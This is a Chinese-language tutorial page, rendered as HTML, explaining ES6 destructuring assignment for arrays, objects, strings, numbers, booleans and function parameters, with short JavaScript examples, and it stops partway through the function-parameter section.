<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="3-变量的解构赋值"><a href="#3-变量的解构赋值" class="headerlink" title="3.变量的解构赋值"></a>3.变量的解构赋值</h3><h4 id="3-1-数组的解构赋值"><a href="#3-1-数组的解构赋值" class="headerlink" title="3.1 数组的解构赋值"></a>3.1 数组的解构赋值</h4><h5 id="3-1-1-基本用法"><a href="#3-1-1-基本用法" class="headerlink" title="3.1.1 基本用法"></a>3.1.1 基本用法</h5><p>ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。</p>
<p>以前，为变量赋值，只能直接指定值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> c = <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>ES6 允许写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure>
<p>上面代码表示，可以从数组中提取值，按照对应位置，对变量赋值。</p>
<p>本质上，这种写法属于“模式匹配”，只要等号两边的模式相同，左边的变量就会被赋予对应的值。下面是一些使用嵌套数组进行解构的例子。</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [foo, [[bar], baz]] = [<span class="number">1</span>, [[<span class="number">2</span>], <span class="number">3</span>]];</span><br><span class="line">foo <span class="comment">// 1</span></span><br><span class="line">bar <span class="comment">// 2</span></span><br><span class="line">baz <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [ , , third] = [<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>, <span class="string">&quot;baz&quot;</span>];</span><br><span class="line">third <span class="comment">// &quot;baz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x, , y] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line">y <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [head, ...tail] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">head <span class="comment">// 1</span></span><br><span class="line">tail <span class="comment">// [2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x, y, ...z] = [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">x <span class="comment">// &quot;a&quot;</span></span><br><span class="line">y <span class="comment">// undefined</span></span><br><span class="line">z <span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p>如果解构不成功，变量的值就等于<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [foo] = [];</span><br><span class="line"><span class="keyword">let</span> [bar, foo] = [<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
<p>以上两种情况都属于解构不成功，<code>foo</code>的值都会等于<code>undefined</code>。</p>
<p>另一种情况是不完全解构，即等号左边的模式，只匹配一部分的等号右边的数组。这种情况下，解构依然可以成功。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x, y] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line">y <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [a, [b], d] = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>], <span class="number">4</span>];</span><br><span class="line">a <span class="comment">// 1</span></span><br><span class="line">b <span class="comment">// 2</span></span><br><span class="line">d <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
<p>上面两个例子，都属于不完全解构，但是可以成功。</p>
<p>如果等号的右边不是数组（或者严格地说，不是可遍历的结构，参见《Iterator》一章），那么将会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">NaN</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = &#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>上面的语句都会报错，因为等号右边的值，要么转为对象以后不具备 Iterator 接口（前五个表达式），要么本身就不具备 Iterator 接口（最后一个表达式）。</p>
<p>对于 Set 结构，也可以使用数组的解构赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x, y, z] = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">x <span class="comment">// &quot;a&quot;</span></span><br></pre></td></tr></table></figure>
<p>事实上，只要某种数据结构具有 Iterator 接口，都可以采用数组形式的解构赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">fibs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> a;</span><br><span class="line">    [a, b] = [b, a + b];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [first, second, third, fourth, fifth, sixth] = fibs();</span><br><span class="line">sixth <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>fibs</code>是一个 Generator 函数（参见《Generator 函数》一章），原生具有 Iterator 接口。解构赋值会依次从这个接口获取值。</p>
<h5 id="3-1-2-默认值"><a href="#3-1-2-默认值" class="headerlink" title="3.1.2 默认值"></a>3.1.2 默认值</h5><p>解构赋值允许指定默认值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [foo = <span class="literal">true</span>] = [];</span><br><span class="line">foo <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>, <span class="literal">undefined</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>注意，ES6 内部使用严格相等运算符（<code>===</code>），判断一个位置是否有值。所以，只有当一个数组成员严格等于<code>undefined</code>，默认值才会生效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">undefined</span>];</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">null</span>];</span><br><span class="line">x <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果一个数组成员是<code>null</code>，默认值就不会生效，因为<code>null</code>不严格等于<code>undefined</code>。</p>
<p>如果默认值是一个表达式，那么这个表达式是惰性求值的，即只有在用到的时候，才会求值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x = f()] = [<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
<p>上面代码中，因为<code>x</code>能取到值，所以函数<code>f</code>根本不会执行。上面的代码其实等价于下面的代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x;</span><br><span class="line"><span class="keyword">if</span> ([<span class="number">1</span>][<span class="number">0</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">  x = f();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  x = [<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认值可以引用解构赋值的其他变量，但该变量必须已经声明。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>, y = x] = [];     <span class="comment">// x=1; y=1</span></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>, y = x] = [<span class="number">2</span>];    <span class="comment">// x=2; y=2</span></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>, y = x] = [<span class="number">1</span>, <span class="number">2</span>]; <span class="comment">// x=1; y=2</span></span><br><span class="line"><span class="keyword">let</span> [x = y, y = <span class="number">1</span>] = [];     <span class="comment">// ReferenceError: y is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面最后一个表达式之所以会报错，是因为<code>x</code>用<code>y</code>做默认值时，<code>y</code>还没有声明。</p>
<h4 id="3-2-对象的解构赋值"><a href="#3-2-对象的解构赋值" class="headerlink" title="3.2 对象的解构赋值"></a>3.2 对象的解构赋值</h4><h5 id="3-2-1-简介"><a href="#3-2-1-简介" class="headerlink" title="3.2.1 简介"></a>3.2.1 简介</h5><p>解构不仅可以用于数组，还可以用于对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">foo <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line">bar <span class="comment">// &quot;bbb&quot;</span></span><br></pre></td></tr></table></figure>
<p>对象的解构与数组有一个重要的不同。数组的元素是按次序排列的，变量的取值由它的位置决定；而对象的属性没有次序，变量必须与属性同名，才能取到正确的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; bar, foo &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">foo <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line">bar <span class="comment">// &quot;bbb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码的第一个例子，等号左边的两个变量的次序，与等号右边两个同名属性的次序不一致，但是对取值完全没有影响。第二个例子的变量没有对应的同名属性，导致取不到值，最后等于<code>undefined</code>。</p>
<p>如果解构失败，变量的值等于<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;foo&#125; = &#123;<span class="attr">bar</span>: <span class="string">&#x27;baz&#x27;</span>&#125;;</span><br><span class="line">foo <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，等号右边的对象没有<code>foo</code>属性，所以变量<code>foo</code>取不到值，所以等于<code>undefined</code>。</p>
<p>对象的解构赋值，可以很方便地将现有对象的方法，赋值到某个变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="keyword">let</span> &#123; log, sin, cos &#125; = <span class="built_in">Math</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="keyword">const</span> &#123; log &#125; = <span class="built_in">console</span>;</span><br><span class="line">log(<span class="string">&#x27;hello&#x27;</span>) <span class="comment">// hello</span></span><br></pre></td></tr></table></figure>
<p>上面代码的例一将<code>Math</code>对象的对数、正弦、余弦三个方法，赋值到对应的变量上，使用起来就会方便很多。例二将<code>console.log</code>赋值到<code>log</code>变量。</p>
<p>如果变量名与属性名不一致，必须写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">first</span>: <span class="string">&#x27;hello&#x27;</span>, <span class="attr">last</span>: <span class="string">&#x27;world&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">first</span>: f, <span class="attr">last</span>: l &#125; = obj;</span><br><span class="line">f <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">l <span class="comment">// &#x27;world&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这实际上说明，对象的解构赋值是下面形式的简写（参见《对象的扩展》一章）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: foo, <span class="attr">bar</span>: bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>也就是说，对象的解构赋值的内部机制，是先找到同名属性，然后再赋给对应的变量。真正被赋值的是后者，而不是前者。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line">foo <span class="comment">// error: foo is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>foo</code>是匹配的模式，<code>baz</code>才是变量。真正被赋值的是变量<code>baz</code>，而不是模式<code>foo</code>。</p>
<p>与数组一样，解构也可以用于嵌套结构的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  p: [</span><br><span class="line">    <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">    &#123; <span class="attr">y</span>: <span class="string">&#x27;World&#x27;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">p</span>: [x, &#123; y &#125;] &#125; = obj;</span><br><span class="line">x <span class="comment">// &quot;Hello&quot;</span></span><br><span class="line">y <span class="comment">// &quot;World&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，这时<code>p</code>是模式，不是变量，因此不会被赋值。如果<code>p</code>也要作为变量赋值，可以写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  p: [</span><br><span class="line">    <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">    &#123; <span class="attr">y</span>: <span class="string">&#x27;World&#x27;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; p, <span class="attr">p</span>: [x, &#123; y &#125;] &#125; = obj;</span><br><span class="line">x <span class="comment">// &quot;Hello&quot;</span></span><br><span class="line">y <span class="comment">// &quot;World&quot;</span></span><br><span class="line">p <span class="comment">// [&quot;Hello&quot;, &#123;y: &quot;World&quot;&#125;]</span></span><br></pre></td></tr></table></figure>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> node = &#123;</span><br><span class="line">  loc: &#123;</span><br><span class="line">    start: &#123;</span><br><span class="line">      line: <span class="number">1</span>,</span><br><span class="line">      column: <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; loc, <span class="attr">loc</span>: &#123; start &#125;, <span class="attr">loc</span>: &#123; <span class="attr">start</span>: &#123; line &#125;&#125; &#125; = node;</span><br><span class="line">line <span class="comment">// 1</span></span><br><span class="line">loc  <span class="comment">// Object &#123;start: Object&#125;</span></span><br><span class="line">start <span class="comment">// Object &#123;line: 1, column: 5&#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码有三次解构赋值，分别是对<code>loc</code>、<code>start</code>、<code>line</code>三个属性的解构赋值。注意，最后一次对<code>line</code>属性的解构赋值之中，只有<code>line</code>是变量，<code>loc</code>和<code>start</code>都是模式，不是变量。</p>
<p>下面是嵌套赋值的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"></span><br><span class="line">(&#123; <span class="attr">foo</span>: obj.prop, <span class="attr">bar</span>: arr[<span class="number">0</span>] &#125; = &#123; <span class="attr">foo</span>: <span class="number">123</span>, <span class="attr">bar</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">obj <span class="comment">// &#123;prop:123&#125;</span></span><br><span class="line">arr <span class="comment">// [true]</span></span><br></pre></td></tr></table></figure>
<p>如果解构模式是嵌套的对象，而且子对象所在的父属性不存在，那么将会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">foo</span>: &#123;bar&#125;&#125; = &#123;<span class="attr">baz</span>: <span class="string">&#x27;baz&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，等号左边对象的<code>foo</code>属性，对应一个子对象。该子对象的<code>bar</code>属性，解构时会报错。原因很简单，因为<code>foo</code>这时等于<code>undefined</code>，再取子属性就会报错。</p>
<p>注意，对象的解构赋值可以取到继承的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> obj2 = &#123; <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj1, obj2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; foo &#125; = obj1;</span><br><span class="line">foo <span class="comment">// &quot;bar&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj1</code>的原型对象是<code>obj2</code>。<code>foo</code>属性不是<code>obj1</code>自身的属性，而是继承自<code>obj2</code>的属性，解构赋值可以取到这个属性。</p>
<h5 id="3-2-2-默认值"><a href="#3-2-2-默认值" class="headerlink" title="3.2.2 默认值"></a>3.2.2 默认值</h5><p>对象的解构也可以指定默认值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> &#123;x = <span class="number">3</span>&#125; = &#123;&#125;;</span><br><span class="line">x <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;x, y = <span class="number">5</span>&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line">y <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">x</span>: y = <span class="number">3</span>&#125; = &#123;&#125;;</span><br><span class="line">y <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">x</span>: y = <span class="number">3</span>&#125; = &#123;<span class="attr">x</span>: <span class="number">5</span>&#125;;</span><br><span class="line">y <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123; <span class="attr">message</span>: msg = <span class="string">&#x27;Something went wrong&#x27;</span> &#125; = &#123;&#125;;</span><br><span class="line">msg <span class="comment">// &quot;Something went wrong&quot;</span></span><br></pre></td></tr></table></figure>
<p>默认值生效的条件是，对象的属性值严格等于<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> &#123;x = <span class="number">3</span>&#125; = &#123;<span class="attr">x</span>: <span class="literal">undefined</span>&#125;;</span><br><span class="line">x <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;x = <span class="number">3</span>&#125; = &#123;<span class="attr">x</span>: <span class="literal">null</span>&#125;;</span><br><span class="line">x <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，属性<code>x</code>等于<code>null</code>，因为<code>null</code>与<code>undefined</code>不严格相等，所以是个有效的赋值，导致默认值<code>3</code>不会生效。</p>
<h5 id="3-2-3-注意点"><a href="#3-2-3-注意点" class="headerlink" title="3.2.3 注意点"></a>3.2.3 注意点</h5><p>（1）如果要将一个已经声明的变量用于解构赋值，必须非常小心。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误的写法</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line">&#123;x&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// SyntaxError: syntax error</span></span><br></pre></td></tr></table></figure>
<p>上面代码的写法会报错，因为 JavaScript 引擎会将<code>&#123;x&#125;</code>理解成一个代码块，从而发生语法错误。只有不将大括号写在行首，避免 JavaScript 将其解释为代码块，才能解决这个问题。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line">(&#123;x&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码将整个解构赋值语句，放在一个圆括号里面，就可以正确执行。关于圆括号与解构赋值的关系，参见下文。</p>
<p>（2）解构赋值允许等号左边的模式之中，不放置任何变量名。因此，可以写出非常古怪的赋值表达式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(&#123;&#125; = [<span class="literal">true</span>, <span class="literal">false</span>]);</span><br><span class="line">(&#123;&#125; = <span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">(&#123;&#125; = []);</span><br></pre></td></tr></table></figure>
<p>上面的表达式虽然毫无意义，但是语法是合法的，可以执行。</p>
<p>（3）由于数组本质是特殊的对象，因此可以对数组进行对象属性的解构。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="number">0</span> : first, [arr.length - <span class="number">1</span>] : last&#125; = arr;</span><br><span class="line">first <span class="comment">// 1</span></span><br><span class="line">last <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码对数组进行对象解构。数组<code>arr</code>的<code>0</code>键对应的值是<code>1</code>，<code>[arr.length - 1]</code>就是<code>2</code>键，对应的值是<code>3</code>。方括号这种写法，属于“属性名表达式”（参见《对象的扩展》一章）。</p>
<h4 id="3-3-字符串的解构赋值"><a href="#3-3-字符串的解构赋值" class="headerlink" title="3.3 字符串的解构赋值"></a>3.3 字符串的解构赋值</h4><p>字符串也可以解构赋值。这是因为此时，字符串被转换成了一个类似数组的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, c, d, e] = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">a <span class="comment">// &quot;h&quot;</span></span><br><span class="line">b <span class="comment">// &quot;e&quot;</span></span><br><span class="line">c <span class="comment">// &quot;l&quot;</span></span><br><span class="line">d <span class="comment">// &quot;l&quot;</span></span><br><span class="line">e <span class="comment">// &quot;o&quot;</span></span><br></pre></td></tr></table></figure>
<p>类似数组的对象都有一个<code>length</code>属性，因此还可以对这个属性解构赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">length</span> : len&#125; = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">len <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<h4 id="3-4-数值和布尔值的解构赋值"><a href="#3-4-数值和布尔值的解构赋值" class="headerlink" title="3.4 数值和布尔值的解构赋值"></a>3.4 数值和布尔值的解构赋值</h4><p>解构赋值时，如果等号右边是数值和布尔值，则会先转为对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">toString</span>: s&#125; = <span class="number">123</span>;</span><br><span class="line">s === <span class="built_in">Number</span>.prototype.toString <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">toString</span>: s&#125; = <span class="literal">true</span>;</span><br><span class="line">s === <span class="built_in">Boolean</span>.prototype.toString <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，数值和布尔值的包装对象都有<code>toString</code>属性，因此变量<code>s</code>都能取到值。</p>
<p>解构赋值的规则是，只要等号右边的值不是对象或数组，就先将其转为对象。由于<code>undefined</code>和<code>null</code>无法转为对象，所以对它们进行解构赋值，都会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: x &#125; = <span class="literal">undefined</span>; <span class="comment">// TypeError</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: y &#125; = <span class="literal">null</span>; <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure>
<h4 id="3-5-函数参数的解构赋值"><a href="#3-5-函数参数的解构赋值" class="headerlink" title="3.5 函数参数的解构赋值"></a>3.5 函数参数的解构赋值</h4><p>函数的参数也可以使用解构赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">[x, y]</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add([<span class="number">1</span>, <span class="number">2</span>]); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>add</code>的参数表面上是一个数组，但在传入参数的那一刻，数组参数就被解构成变量<code>x</code>和<code>y</code>。对于函数内部的代码来说，它们能感受到的参数就是<code>x</code>和<code>y</code>。</p>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]].map(<span class="function">(<span class="params">[a, b]</span>) =&gt;</span> a + b);</span><br><span class="line"><span class="comment">// [ 3, 7 ]</span></span><br></pre></td></tr></table></figure>
<p>函数参数的解构也可以使用默认值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params">&#123;x = <span class="number">0</span>, y = <span class="number">0</span>&#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">move(&#123;<span class="attr">x</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">8</span>&#125;); <span class="comment">// [3, 8]</span></span><br><span class="line">move(&#123;<span class="attr">x</span>: <span class="number">3</span>&#125;); <span class="comment">// [3, 0]</span></span><br><span class="line">move(&#123;&#125;); <span class="comment">// [0, 0]</span></span><br><span class="line">move(); <span class="comment">// [0, 0]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，函数<code>move</code>的参数是一个对象，通过对这个对象进行解构，得到变量<code>x</code>和<code>y</code>的值。如果解构失败，<code>x</code>和<code>y</code>等于默认值。</p>
<p>注意，下面的写法会得到不一样的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params">&#123;x, y&#125; = &#123; x: <span class="number">0</span>, y: <span class="number">0</span> &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">move(&#123;<span class="attr">x</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">8</span>&#125;); <span class="comment">// [3, 8]</span></span><br><span class="line">move(&#123;<span class="attr">x</span>: <span class="number">3</span>&#125;); <span class="comment">// [3, undefined]</span></span><br><span class="line">move(&#123;&#125;); <span class="comment">// [undefined, undefined]</span></span><br><span class="line">move(); <span class="comment">// [0, 0]</span></span><br></pre></td></tr></table></figure>
<p>上面代码是为函数<code>move</code>的参数指定默认值，而不是为变量<code>x</code>和<code>y</code>指定默认值，所以会得到与前一种写法不同的结果。</p>
<p><code>undefined</code>就会触发函数参数的默认值。</p>
